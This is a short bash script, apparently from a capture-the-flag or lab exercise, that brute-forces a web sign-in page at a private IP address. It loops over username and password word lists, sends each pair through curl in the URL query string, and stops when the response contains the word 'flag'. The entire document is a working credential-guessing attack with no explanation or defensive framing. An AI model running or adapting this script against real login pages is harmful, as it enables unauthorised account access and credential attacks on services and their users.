
test_url() {
	echo "test user $1, pass $2"
	curl "http://10.12.248.148/?page=signin&username=$1&Login=Login&password=$2" 2> /dev/null | grep -i flag
	if [ $? -eq 0 ]; then
		echo "FOUND"
		exit
	fi
}

while read -r username; do
	while read -r password; do
		test_url "$username" "$password"
	done < passwords.txt
done < usernames.txt

